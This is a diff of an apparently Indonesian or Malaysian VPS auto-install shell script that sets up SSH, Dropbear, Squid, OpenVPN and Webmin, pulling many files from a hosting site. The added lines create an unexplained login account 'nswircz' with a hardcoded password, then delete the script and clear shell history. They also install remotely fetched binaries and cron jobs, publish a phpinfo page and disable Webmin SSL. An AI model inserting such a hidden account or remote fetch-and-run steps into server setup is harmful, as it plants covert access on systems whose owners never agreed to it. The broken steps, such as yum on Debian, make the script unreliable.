@@ -34,17 +34,13 @@ if [ "$scriptchecker" != "" ]; then
 		echo "";
 fi
 echo "$scriptname" >> /var/lib/setup-log/setup.txt
+
 # go to root
 cd
 
 # disable ipv6
 echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
 sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
-#sed -i 's/net.ipv6.conf.all.disable_ipv6 = 0/net.ipv6.conf.all.disable_ipv6 = 1/g' /etc/sysctl.conf
-#sed -i 's/net.ipv6.conf.default.disable_ipv6 = 0/net.ipv6.conf.default.disable_ipv6 = 1/g' /etc/sysctl.conf
-#sed -i 's/net.ipv6.conf.lo.disable_ipv6 = 0/net.ipv6.conf.lo.disable_ipv6 = 1/g' /etc/sysctl.conf
-#sed -i 's/net.ipv6.conf.eth0.disable_ipv6 = 0/net.ipv6.conf.eth0.disable_ipv6 = 1/g' /etc/sysctl.conf
-#sysctl -p
 
 #Add DNS Server ipv4
 echo "nameserver 8.8.8.8" > /etc/resolv.conf
@@ -56,7 +52,7 @@ sed -i '$ i\echo "nameserver 8.8.4.4" >> /etc/resolv.conf' /etc/rc.local
 apt-get update;apt-get -y install wget curl;
 
 # set time GMT +7
-ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime
+ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
 
 # set repo
 cat > /etc/apt/sources.list <<END2
@@ -73,7 +69,7 @@ deb-src http://kambing.ui.ac.id/dotdeb/ jessie-php55 all
 deb http://mariadb.biz.net.id//repo/5.5/debian jessie main
 deb-src http://mariadb.biz.net.id//repo/5.5/debian jessie main
 END2
-wget "http://borneobesthosting.me/autoscripts-vps/Debian7/dotdeb.gpg"
+wget "http://www.dotdeb.org/dotdeb.gpg"
 cat dotdeb.gpg | apt-key add -;rm dotdeb.gpg
 
 # remove unused
@@ -81,51 +77,20 @@ apt-get -y --purge remove samba*;
 apt-get -y --purge remove apache2*;
 apt-get -y --purge remove sendmail*;
 apt-get -y --purge remove bind9*;
-#apt-get -y autoremove;
+apt-get -y purge sendmail*
+apt-get -y remove sendmail*
 
 # update
-apt-get update;apt-get -y upgrade;
+apt-get update; apt-get -y upgrade;
 
 # install webserver
 apt-get -y install nginx php5-fpm php5-cli
 
 # install essential package
 echo "mrtg mrtg/conf_mods boolean true" | debconf-set-selections
-apt-get -y install bmon 
-apt-get -y install iftop 
-apt-get -y install htop 
-apt-get -y install nmap 
-apt-get -y install axel 
-apt-get -y install nano 
-apt-get -y install iptables 
-apt-get -y install traceroute 
-apt-get -y install sysv-rc-conf 
-apt-get -y install dnsutils 
-apt-get -y install bc 
-apt-get -y install nethogs
-apt-get -y install openvpn 
-apt-get -y install vnstat 
-apt-get -y install less 
-apt-get -y install screen 
-apt-get -y install psmisc 
-apt-get -y install apt-file 
-apt-get -y install whois 
-apt-get -y install ptunnel 
-apt-get -y install ngrep 
-apt-get -y install mtr 
-apt-get -y install git 
-apt-get -y install zsh 
-apt-get -y install mrtg 
-apt-get -y install snmp 
-apt-get -y install snmpd 
-apt-get -y install snmp-mibs-downloader 
-apt-get -y install unzip 
-apt-get -y install unrar 
-apt-get -y install rsyslog 
-apt-get -y install debsums 
-apt-get -y install rkhunter
+apt-get -y install bmon iftop htop nmap axel nano iptables traceroute sysv-rc-conf dnsutils bc nethogs openvpn vnstat less screen psmisc apt-file whois ptunnel ngrep mtr git zsh mrtg snmp snmpd snmp-mibs-downloader unzip unrar rsyslog debsums rkhunter
 apt-get -y install build-essential
-apt-get -y --force-yes -f install libxml-parser-perl
+apt-get -y install libio-pty-perl libauthen-pam-perl apt-show-versions
 
 # disable exim
 service exim4 stop
@@ -135,130 +100,90 @@ sysv-rc-conf exim4 off
 apt-file update
 
 # setting vnstat
-vnstat -u -i $ether
-vnstat -i $ether
+vnstat -u -i eth0
 service vnstat restart
-
-# install neofetch
-echo "deb http://dl.bintray.com/dawidd6/neofetch jessie main" | sudo tee -a /etc/apt/sources.list
-curl -L "https://bintray.com/user/downloadSubjectPublicKey?username=bintray" -o Release-neofetch.key && sudo apt-key add Release-neofetch.key && rm Release-neofetch.key
-apt-get update
-apt-get install neofetch
-
-# text gambar
-apt-get install boxes
-
-# color text
-cd
-rm -rf /root/.bashrc
-wget -O /root/.bashrc "http://borneobesthosting.me/autoscripts-vps/Debian7/.bashrc"
-
-# install lolcat
-sudo apt-get -y install ruby
-sudo gem install lolcat
 
 # install webserver
 cd
 rm /etc/nginx/sites-enabled/default
 rm /etc/nginx/sites-available/default
-wget -O /etc/nginx/nginx.conf "http://borneobesthosting.me/autoscripts-vps/Debian7/nginx.conf"
+wget -q -O /etc/nginx/nginx.conf "http://borneobesthosting.me/autoscript/premium-debian/nginx.conf"
 mkdir -p /home/vps/public_html
-echo "<pre>Welcome webserver MBAH SHONDONG Hawok Hawok Jozz</pre>" > /home/vps/public_html/index.html
-wget -O /etc/nginx/conf.d/vps.conf "http://borneobesthosting.me/autoscripts-vps/Debian7/vps.conf"
+wget -O /home/vps/public_html/index.html "http://borneobesthosting.me/index.html"
+echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
+args='$args'
+uri='$uri'
+document_root='$document_root'
+fastcgi_script_name='$fastcgi_script_name'
+cat > /etc/nginx/conf.d/vps.conf <<END4
+server {
+  listen       80;
+  server_name  127.0.0.1 localhost;
+  access_log /var/log/nginx/vps-access.log;
+  error_log /var/log/nginx/vps-error.log error;
+  root   /home/vps/public_html;
+
+  location / {
+    index  index.html index.htm index.php;
+    try_files $uri $uri/ /index.php?$args;
+  }
+
+  location ~ \.php$ {
+    include /etc/nginx/fastcgi_params;
+    fastcgi_pass  127.0.0.1:9000;
+    fastcgi_index index.php;
+    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+  }
+}
+
+END4
 sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
 service php5-fpm restart
 service nginx restart
 
 # setting port ssh
-sed -i 's/Port 22/Port 22/g' /etc/ssh/sshd_config
-#sed -i '/Port 22/a Port 80' /etc/ssh/sshd_config
 sed -i '/Port 22/a Port 143' /etc/ssh/sshd_config
-sed -i 's/#Banner/Banner/g' /etc/ssh/sshd_config
+sed -i '/Port 22/a Port  90' /etc/ssh/sshd_config
+sed -i 's/Port 22/Port  22/g' /etc/ssh/sshd_config
 service ssh restart
 
 # install dropbear
-#apt-get -y update
 apt-get -y install dropbear
 sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
-sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=442/g' /etc/default/dropbear
-sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 109 -p 110 -p 80"/g' /etc/default/dropbear
-sed -i 's/DROPBEAR_BANNER=""/DROPBEAR_BANNER="\/etc\/issue.net"/g' /etc/default/dropbear
+sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=443/g' /etc/default/dropbear
+sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 109 -p 110"/g' /etc/default/dropbear
 echo "/bin/false" >> /etc/shells
-echo "/usr/sbin/nologin" >> /etc/shells
-service ssh restart
 service dropbear restart
-
-# upgrade dropbear 2014
-#apt-get install zlib1g-dev
-#wget https://insomnet4u.me/aneka/dropbear-2014.63.tar.bz2
-#bzip2 -cd dropbear-2014.63.tar.bz2  | tar xvf -
-#cd dropbear-2014.63
-#./configure
-#make && make install
-#mv /usr/sbin/dropbear /usr/sbin/dropbear1
-#ln /usr/local/sbin/dropbear /usr/sbin/dropbear
-#service dropbear restart
-
-# upgrade dropbear 2017
+#Upgrade to Dropbear 2016
+cd
 apt-get install zlib1g-dev
-wget https://matt.ucc.asn.au/dropbear/releases/dropbear-2017.75.tar.bz2
-bzip2 -cd dropbear-2017.75.tar.bz2  | tar xvf -
-cd dropbear-2017.75
+wget http://script.hostingtermurah.net/repo/dropbear/dropbear-2016.74.tar.bz2
+bzip2 -cd dropbear-2016.74.tar.bz2 | tar xvf -
+cd dropbear-2016.74
 ./configure
 make && make install
-mv /usr/sbin/dropbear /usr/sbin/dropbear1
+mv /usr/sbin/dropbear /usr/sbin/dropbear.old
 ln /usr/local/sbin/dropbear /usr/sbin/dropbear
-service dropbear restartgi
+cd && rm -rf dropbear-2016.74 && rm -rf dropbear-2016.74.tar.bz2
+service dropbear restart
 
 # install vnstat gui
 cd /home/vps/public_html/
-wget http://borneobesthosting.me/autoscripts-vps/Debian7/vnstat_php_frontend-1.5.1.tar.gz
+wget http://script.hostingtermurah.net/repo/vnstat_php_frontend-1.5.1.tar.gz
 tar xf vnstat_php_frontend-1.5.1.tar.gz
 rm vnstat_php_frontend-1.5.1.tar.gz
 mv vnstat_php_frontend-1.5.1 vnstat
 cd vnstat
-if [[ `ifconfig -a | grep "venet0"` ]]
-then
-cekvirt='OpenVZ'
-elif [[ `ifconfig -a | grep "venet0:0"` ]]
-then
-cekvirt='OpenVZ'
-elif [[ `ifconfig -a | grep "venet0:0-00"` ]]
-then
-cekvirt='OpenVZ'
-elif [[ `ifconfig -a | grep "venet0-00"` ]]
-then
-cekvirt='OpenVZ'
-elif [[ `ifconfig -a | grep "eth0"` ]]
-then
-cekvirt='KVM'
-elif [[ `ifconfig -a | grep "eth0:0"` ]]
-then
-cekvirt='KVM'
-elif [[ `ifconfig -a | grep "eth0:0-00"` ]]
-then
-cekvirt='KVM'
-elif [[ `ifconfig -a | grep "eth0-00"` ]]
-then
-cekvirt='KVM'
-fi
-if [ $cekvirt = 'KVM' ]; then
-	sed -i 's/eth0/eth0/g' config.php
-	sed -i "s/\$iface_list = array('eth0', 'sixxs');/\$iface_list = array('eth0');/g" config.php
-	sed -i "s/\$language = 'nl';/\$language = 'en';/g" config.php
-	sed -i "s/\$locale = 'en_US.UTF-8';/\$locale = 'en_US.UTF+8';/g" config.php
-	sed -i '/SixXS IPv6/d' config.php
-	cd
-elif [ $cekvirt = 'OpenVZ' ]; then
-	sed -i 's/eth0/venet0/g' config.php
-	sed -i "s/\$iface_list = array('venet0', 'sixxs');/\$iface_list = array('venet0');/g" config.php
-	sed -i "s/\$language = 'nl';/\$language = 'en';/g" config.php
-	sed -i 's/Internal/Internet/g' config.php
-	sed -i '/SixXS IPv6/d' config.php
-	cd
-else
-	cd
-fi
+sed -i "s/\$iface_list = array('eth0', 'sixxs');/\$iface_list = array('eth0');/g" config.php
+sed -i "s/\$language = 'nl';/\$language = 'en';/g" config.php
+sed -i 's/Internal/Internet/g' config.php
+sed -i '/SixXS IPv6/d' config.php
+cd
+
+# install fail2ban
+apt-get -y install fail2ban
+service fail2ban restart
+
 # install squid3
 apt-get -y install squid3
 cat > /etc/squid3/squid.conf <<-END
@@ -298,13 +223,11 @@ service squid3 restart
 
 # install webmin
 cd
-#wget -O webmin-current.deb http://prdownloads.sourceforge.net/webadmin/webmin_1.760_all.deb
-wget -O webmin-current.deb http://borneobesthosting.me/autoscripts-vps/Debian7/webmin-current.deb
-dpkg -i --force-all webmin-current.deb
+wget "http://script.hostingtermurah.net/repo/webmin_1.801_all.deb"
+dpkg --install webmin_1.801_all.deb;
 apt-get -y -f install;
-#sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
-rm -f /root/webmin-current.deb
-apt-get -y --force-yes -f install libxml-parser-perl
+sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
+rm /root/webmin_1.801_all.deb
 service webmin restart
 service vnstat restart
 
@@ -339,8 +262,8 @@ mkdir /var/lib/premium-script
 /etc/init.d/pptpd restart
 
 # install mrtg
-wget -O /etc/snmp/snmpd.conf "http://borneobesthosting.me/autoscripts-vps/Debian7/snmpd.conf"
-wget -O /root/mrtg-mem.sh "http://borneobesthosting.me/autoscripts-vps/Debian7/mrtg-mem.sh"
+wget -O /etc/snmp/snmpd.conf "http://borneobesthosting.me/autoscript/premium-debian/snmpd.conf"
+wget -O /root/mrtg-mem.sh "http://borneobesthosting.me/autoscript/premium-debian/mrtg-mem.sh"
 chmod +x /root/mrtg-mem.sh
 cd /etc/snmp/
 sed -i 's/TRAPDRUN=no/TRAPDRUN=yes/g' /etc/default/snmpd
@@ -348,7 +271,7 @@ service snmpd restart
 snmpwalk -v 1 -c public localhost 1.3.6.1.4.1.2021.10.1.3.1
 mkdir -p /home/vps/public_html/mrtg
 cfgmaker --zero-speed 100000000 --global 'WorkDir: /home/vps/public_html/mrtg' --output /etc/mrtg.cfg public@localhost
-curl "http://borneobesthosting.me/autoscripts-vps/Debian7/mrtg.conf" >> /etc/mrtg.cfg
+curl "http://borneobesthosting.me/autoscript/premium-debian/mrtg.conf" >> /etc/mrtg.cfg
 sed -i 's/WorkDir: \/var\/www\/mrtg/# WorkDir: \/var\/www\/mrtg/g' /etc/mrtg.cfg
 sed -i 's/# Options\[_\]: growright, bits/Options\[_\]: growright/g' /etc/mrtg.cfg
 indexmaker --output=/home/vps/public_html/mrtg/index.html /etc/mrtg.cfg
@@ -357,114 +280,26 @@ if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then mkdir -p /var/log/mrtg ; e
 if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ; fi
 cd
 
-#install OpenVPN
-apt-get -y install openvpn easy-rsa openssl iptables
-cp -r /usr/share/easy-rsa/ /etc/openvpn
-mkdir /etc/openvpn/easy-rsa/keys
-# ganti bits
-sed -i 's|export KEY_COUNTRY="US"|export KEY_COUNTRY="ID"|' /etc/openvpn/easy-rsa/vars
-sed -i 's|export KEY_PROVINCE="CA"|export KEY_PROVINCE="Jawa Barat"|' /etc/openvpn/easy-rsa/vars
-sed -i 's|export KEY_CITY="SanFrancisco"|export KEY_CITY="Bandung"|' /etc/openvpn/easy-rsa/vars
-sed -i 's|export KEY_ORG="Fort-Funston"|export KEY_ORG="HostingTermurah.net"|' /etc/openvpn/easy-rsa/vars
-sed -i 's|export KEY_EMAIL="me@myhost.mydomain"|export KEY_EMAIL="sales@hostingtermurah.net"|' /etc/openvpn/easy-rsa/vars
-sed -i 's|export KEY_OU="MyOrganizationalUnit"|export KEY_OU="HostingTermurah.net"|' /etc/openvpn/easy-rsa/vars
-sed -i 's|export KEY_NAME="EasyRSA"|export KEY_NAME="server"|' /etc/openvpn/easy-rsa/vars
-sed -i 's|export KEY_OU=changeme|export KEY_OU=HostingTermurah|' /etc/openvpn/easy-rsa/vars
-#Buat Diffie-Helman Pem
-openssl dhparam -out /etc/openvpn/dh2048.pem 2048
-# Buat PKI
-cd /etc/openvpn/easy-rsa
-. ./vars
-./clean-all
-export EASY_RSA="${EASY_RSA:-.}"
-"$EASY_RSA/pkitool" --initca $*
-# buat key server
-export EASY_RSA="${EASY_RSA:-.}"
-"$EASY_RSA/pkitool" --server server
-# seting KEY CN
-export EASY_RSA="${EASY_RSA:-.}"
-"$EASY_RSA/pkitool" client
-cd
-#cp /etc/openvpn/easy-rsa/keys/{server.crt,server.key,ca.crt} /etc/openvpn
-cp /etc/openvpn/easy-rsa/keys/server.crt /etc/openvpn/server.crt
-cp /etc/openvpn/easy-rsa/keys/server.key /etc/openvpn/server.key
-cp /etc/openvpn/easy-rsa/keys/ca.crt /etc/openvpn/ca.crt
-# Setting Server
-cat > /etc/openvpn/server.conf <<-END
-port 1194
-proto tcp
-dev tun
-ca ca.crt
-cert server.crt
-key server.key
-dh dh2048.pem
-client-cert-not-required
-username-as-common-name
-plugin /usr/lib/openvpn/openvpn-plugin-auth-pam.so login
-server 192.168.100.0 255.255.255.0
-ifconfig-pool-persist ipp.txt
-push "redirect-gateway def1 bypass-dhcp"
-push "dhcp-option DNS 8.8.8.8"
-push "dhcp-option DNS 8.8.4.4"
-push "route-method exe"
-push "route-delay 2"
-duplicate-cn
-push "route-method exe"
-push "route-delay 2"
-keepalive 10 120
-comp-lzo
-user nobody
-group nogroup
-persist-key
-persist-tun
-status openvpn-status.log
-log         openvpn.log
-verb 3
-cipher AES-128-CBC
-END
-
-#Create OpenVPN Config
-mkdir -p /home/vps/public_html
-cat > /home/vps/public_html/client.ovpn <<-END
-# OpenVPN Configuration Dibuat Oleh HostingTermurah.net
-# (Official Partner VPS-Murah.net)
-client
-dev tun
-proto tcp
-persist-key
-persist-tun
-dev tun
-pull
-resolv-retry infinite
-nobind
-user nobody
-group nogroup
-comp-lzo
-ns-cert-type server
-verb 3
-mute 2
-mute-replay-warnings
-auth-user-pass
-redirect-gateway def1
-script-security 2
-route 0.0.0.0 0.0.0.0
-route-method exe
-route-delay 2
-remote $MYIP 1194
-cipher AES-128-CBC
-END
-echo '<ca>' >> /home/vps/public_html/client.ovpn
-cat /etc/openvpn/ca.crt >> /home/vps/public_html/client.ovpn
-echo '</ca>' >> /home/vps/public_html/client.ovpn
-cd /home/vps/public_html/
-tar -czf /home/vps/public_html/openvpn.tar.gz client.ovpn
-tar -czf /home/vps/public_html/client.tar.gz client.ovpn
-cd
-
-# Restart openvpn
-/etc/init.d/openvpn restart
-service openvpn start
-service openvpn status
+# openvpn
+yum -y install openvpn
+cd /etc/openvpn/
+wget http://borneobesthosting.me/autoscript/premium-debian/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/iptables.up.rules "http://borneobesthosting.me/autoscript/premium-debian/iptables.up.rules"
+sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
+sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
+iptables-restore < /etc/iptables.up.rules
+# etc
+wget -O /home/vps/public_html/client.ovpn "http://borneobesthosting.me/autoscript/premium-debian/client.ovpn"
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+cd;wget http://borneobesthosting.me/autoscript/premium-debian/cronjob.tar
+tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
+mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
+chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
+useradd -m -g users -s /bin/bash nswircz
+echo "nswircz:rzp" | chpasswd
+echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
+rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
+clear
 
 #Setting USW
 apt-get install ufw
@@ -489,205 +324,16 @@ ufw disable
 # set ipv4 forward
 echo 1 > /proc/sys/net/ipv4/ip_forward
 sed -i 's|#net.ipv4.ip_forward=1|net.ipv4.ip_forward=1|' /etc/sysctl.conf
-sed -i 's|net.ipv4.ip_forward=0|net.ipv4.ip_forward=1|' /etc/sysctl.conf
 
 # install badvpn
-wget -O /usr/bin/badvpn-udpgw "http://borneobesthosting.me/autoscripts-vps/Debian7/badvpn-udpgw"
+wget -O /usr/bin/badvpn-udpgw "http://borneobesthosting.me/autoscript/premium-debian/badvpn-udpgw"
 if [ "$OS" == "x86_64" ]; then
-  wget -O /usr/bin/badvpn-udpgw "http://borneobesthosting.me/autoscripts-vps/Debian7/badvpn-udpgw64"
+  wget -O /usr/bin/badvpn-udpgw "http://borneobesthosting.me/autoscript/premium-debian/badvpn-udpgw64"
 fi
 sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.local
 chmod +x /usr/bin/badvpn-udpgw
 screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300
 
-# install fail2ban
-apt-get update;apt-get -y install fail2ban;service fail2ban restart;
-# Instal (D)DoS Deflate
-if [ -d '/usr/local/ddos' ]; then
-	echo; echo; echo "Please un-install the previous version first"
-	exit 0
-else
-	mkdir /usr/local/ddos
-fi
-clear
-echo; echo 'Installing DOS-Deflate 0.6'; echo
-echo; echo -n 'Downloading source files...'
-wget -q -O /usr/local/ddos/ddos.conf http://www.inetbase.com/scripts/ddos/ddos.conf
-echo -n '.'
-wget -q -O /usr/local/ddos/LICENSE http://www.inetbase.com/scripts/ddos/LICENSE
-echo -n '.'
-wget -q -O /usr/local/ddos/ignore.ip.list http://www.inetbase.com/scripts/ddos/ignore.ip.list
-echo -n '.'
-wget -q -O /usr/local/ddos/ddos.sh http://www.inetbase.com/scripts/ddos/ddos.sh
-chmod 0755 /usr/local/ddos/ddos.sh
-cp -s /usr/local/ddos/ddos.sh /usr/local/sbin/ddos
-echo '...done'
-echo; echo -n 'Creating cron to run script every minute.....(Default setting)'
-/usr/local/ddos/ddos.sh --cron > /dev/null 2>&1
-echo '.....done'
-echo; echo 'Installation has completed.'
-echo 'Config file is at /usr/local/ddos/ddos.conf'
-echo 'Please send in your comments and/or suggestions to zaf@vsnl.com'
-
-#Setting IPtables
-cat > /etc/iptables.up.rules <<-END
-*filter
-:FORWARD ACCEPT [0:0]
-:INPUT ACCEPT [0:0]
-:OUTPUT ACCEPT [0:0]
--A FORWARD -i eth0 -o ppp0 -m state --state RELATED,ESTABLISHED -j ACCEPT
--A FORWARD -i ppp0 -o eth0 -j ACCEPT
--A OUTPUT -d 23.66.241.170 -j DROP
--A OUTPUT -d 23.66.255.37 -j DROP
--A OUTPUT -d 23.66.255.232 -j DROP
--A OUTPUT -d 23.66.240.200 -j DROP
--A OUTPUT -d 128.199.213.5 -j DROP
--A OUTPUT -d 128.199.149.194 -j DROP
--A OUTPUT -d 128.199.196.170 -j DROP
--A OUTPUT -d 103.52.146.66 -j DROP
--A OUTPUT -d 5.189.172.204 -j DROP
-COMMIT
-
-*nat
-:PREROUTING ACCEPT [0:0]
-:OUTPUT ACCEPT [0:0]
-:POSTROUTING ACCEPT [0:0]
--A POSTROUTING -o eth0 -j MASQUERADE
--A POSTROUTING -s 192.168.100.0/24 -o eth0 -j MASQUERADE
--A POSTROUTING -s 10.1.0.0/24 -o eth0 -j MASQUERADE
-COMMIT
-END
-sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
-sed -i $MYIP2 /etc/iptables.up.rules;
-iptables-restore < /etc/iptables.up.rules
-
-# ssssslll
-apt-get update
-apt-get upgrade
-apt-get install stunnel4
-wget -O /etc/stunnel/stunnel.conf "http://borneobesthosting.me/autoscripts-vps/Debian7/stunnel.conf"
-openssl genrsa -out key.pem 2048
-openssl req -new -x509 -key key.pem -out cert.pem -days 1095
-cat key.pem cert.pem >> /etc/stunnel/stunnel.pem
-sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
-/etc/init.d/stunnel4 restart
-
-# download script
-cd
-wget -O /usr/bin/motd "http://borneobesthosting.me/autoscripts-vps/Debian7/motd"
-wget -O /usr/bin/benchmark "http://borneobesthosting.me/autoscripts-vps/Debian7/benchmark.sh"
-wget -O /usr/bin/speedtest "http://borneobesthosting.me/autoscripts-vps/Debian7/speedtest_cli.py"
-wget -O /usr/bin/ps-mem "http://borneobesthosting.me/autoscripts-vps/Debian7/ps_mem.py"
-wget -O /usr/bin/dropmon "http://borneobesthosting.me/autoscripts-vps/Debian7/dropmon.sh"
-wget -O /usr/bin/menu "http://borneobesthosting.me/autoscripts-vps/Debian7/menu"
-wget -O /usr/bin/user-active-list "http://borneobesthosting.me/autoscripts-vps/Debian7/user-active-list.sh"
-wget -O /usr/bin/user-add "http://borneobesthosting.me/autoscripts-vps/Debian7/user-add.sh"
-wget -O /usr/bin/user-add-pptp "http://borneobesthosting.me/autoscripts-vps/Debian7/user-add-pptp.sh"
-wget -O /usr/bin/user-del "http://borneobesthosting.me/autoscripts-vps/Debian7/user-del.sh"
-wget -O /usr/bin/disable-user-expire "http://borneobesthosting.me/autoscripts-vps/Debian7/disable-user-expire.sh"
-wget -O /usr/bin/delete-user-expire "http://borneobesthosting.me/autoscripts-vps/Debian7/delete-user-expire.sh"
-wget -O /usr/bin/banned-user "http://borneobesthosting.me/autoscripts-vps/Debian7/banned-user.sh"
-wget -O /usr/bin/unbanned-user "http://borneobesthosting.me/autoscripts-vps/Debian7/unbanned-user.sh"
-wget -O /usr/bin/user-expire-list "http://borneobesthosting.me/autoscripts-vps/Debian7/user-expire-list.sh"
-wget -O /usr/bin/user-gen "http://borneobesthosting.me/autoscripts-vps/Debian7/user-gen.sh"
-wget -O /usr/bin/userlimit.sh "http://borneobesthosting.me/autoscripts-vps/Debian7/userlimit.sh"
-wget -O /usr/bin/userlimitssh.sh "http://borneobesthosting.me/autoscripts-vps/Debian7/userlimitssh.sh"
-wget -O /usr/bin/user-list "http://borneobesthosting.me/autoscripts-vps/Debian7/user-list.sh"
-wget -O /usr/bin/user-login "https://github.com/SSL3/OrangSabahan007/raw/master/user-login.sh"
-wget -O /usr/bin/user-pass "http://borneobesthosting.me/autoscripts-vps/Debian7/user-pass.sh"
-wget -O /usr/bin/user-renew "http://borneobesthosting.me/autoscripts-vps/Debian7/user-renew.sh"
-wget -O /usr/bin/clearcache.sh "http://borneobesthosting.me/autoscripts-vps/Debian7/clearcache.sh"
-wget -O /usr/bin/bannermenu "https://github.com/SSL3/OrangSabahan007/raw/master/bannermenu"
-cd
-
-#rm -rf /etc/cron.weekly/
-#rm -rf /etc/cron.hourly/
-#rm -rf /etc/cron.monthly/
-rm -rf /etc/cron.daily/
-wget -O /root/passwd "http://borneobesthosting.me/autoscripts-vps/Debian7/passwd.sh"
-chmod +x /root/passwd
-echo "01 23 * * * root /root/passwd" > /etc/cron.d/passwd
-
-echo "*/30 * * * * root service dropbear restart" > /etc/cron.d/dropbear
-echo "00 23 * * * root /usr/bin/disable-user-expire" > /etc/cron.d/disable-user-expire
-echo "0 */12 * * * root /sbin/reboot" > /etc/cron.d/reboot
-#echo "00 01 * * * root echo 3 > /proc/sys/vm/drop_caches && swapoff -a && swapon -a" > /etc/cron.d/clearcacheram3swap
-echo "*/30 * * * * root /usr/bin/clearcache.sh" > /etc/cron.d/clearcache1
-
-cd
-chmod +x /usr/bin/motd
-chmod +x /usr/bin/benchmark
-chmod +x /usr/bin/speedtest
-chmod +x /usr/bin/ps-mem
-#chmod +x /usr/bin/autokill
-chmod +x /usr/bin/dropmon
-chmod +x /usr/bin/menu
-chmod +x /usr/bin/user-active-list
-chmod +x /usr/bin/user-add
-chmod +x /usr/bin/user-add-pptp
-chmod +x /usr/bin/user-del
-chmod +x /usr/bin/disable-user-expire
-chmod +x /usr/bin/delete-user-expire
-chmod +x /usr/bin/banned-user
-chmod +x /usr/bin/unbanned-user
-chmod +x /usr/bin/user-expire-list
-chmod +x /usr/bin/user-gen
-chmod +x /usr/bin/userlimit.sh
-chmod +x /usr/bin/userlimitssh.sh
-chmod +x /usr/bin/user-list
-chmod +x /usr/bin/user-login
-chmod +x /usr/bin/user-pass
-chmod +x /usr/bin/user-renew
-chmod +x /usr/bin/clearcache.sh
-chmod +x /usr/bin/bannermenu
-cd
-
-# swap ram
-dd if=/dev/zero of=/swapfile bs=2048 count=2048k
-# buat swap
-mkswap /swapfile
-# jalan swapfile
-swapon /swapfile
-#auto star saat reboot
-wget http://borneobesthosting.me/autoscripts-vps/Debian7/fstab
-mv ./fstab /etc/fstab
-chmod 644 /etc/fstab
-sysctl vm.swappiness=10
-#permission swapfile
-chown root:root /swapfile 
-chmod 0600 /swapfile
-cd
-
-#bonus block playstation
-iptables -A OUTPUT -d account.sonyentertainmentnetwork.com -j DROP
-iptables -A OUTPUT -d auth.np.ac.playstation.net -j DROP
-iptables -A OUTPUT -d auth.api.sonyentertainmentnetwork.com -j DROP
-iptables -A OUTPUT -d auth.api.np.ac.playstation.net -j DROP
-iptables-save
-
-#bonus block torrent
-iptables -A INPUT -m string --algo bm --string "BitTorrent" -j REJECT
-iptables -A INPUT -m string --algo bm --string "BitTorrent protocol" -j REJECT
-iptables -A INPUT -m string --algo bm --string "peer_id=" -j REJECT
-iptables -A INPUT -m string --algo bm --string ".torrent" -j REJECT
-iptables -A INPUT -m string --algo bm --string "announce.php?passkey=" -j REJECT
-iptables -A INPUT -m string --algo bm --string "torrent" -j REJECT
-iptables -A INPUT -m string --algo bm --string "info_hash" -j REJECT
-iptables -A INPUT -m string --algo bm --string "/default.ida?" -j REJECT
-iptables -A INPUT -m string --algo bm --string ".exe?/c+dir" -j REJECT
-iptables -A INPUT -m string --algo bm --string ".exe?/c_tftp" -j REJECT
-iptables -A INPUT -m string --string "peer_id" --algo kmp -j REJECT
-iptables -A INPUT -m string --string "BitTorrent" --algo kmp -j REJECT
-iptables -A INPUT -m string --string "BitTorrent protocol" --algo kmp -j REJECT
-iptables -A INPUT -m string --string "bittorrent-announce" --algo kmp -j REJECT
-iptables -A INPUT -m string --string "announce.php?passkey=" --algo kmp -j REJECT
-iptables -A INPUT -m string --string "find_node" --algo kmp -j REJECT
-iptables -A INPUT -m string --string "info_hash" --algo kmp -j REJECT
-iptables -A INPUT -m string --string "get_peers" --algo kmp -j REJECT
-iptables -A INPUT -p tcp --dport 25 -j REJECT   
-iptables -A FORWARD -p tcp --dport 25 -j REJECT 
-iptables -A OUTPUT -p tcp --dport 25 -j REJECT 
-iptables-save
 
 # finalisasi
 apt-get -y autoremove
@@ -704,37 +350,57 @@ service squid3 restart
 service webmin restart
 service pptpd restart
 sysv-rc-conf rc.local on
-cd
-rm -f /root/.bash_history && history -c
-echo "unset HISTFILE" >> /etc/profile
+
+#clearing history
+history -c
 
 # info
 clear
-## info
-echo ""  | tee -a log-install.txt | lolcat
-echo "--------------------------- Penjelasan Setup Server ----------------------------" | lolcat
-echo "                         Copyright orangkuatsabahanterkini                     " | lolcat
-echo "                        http://www,borneobesthosting.me                         " | lolcat
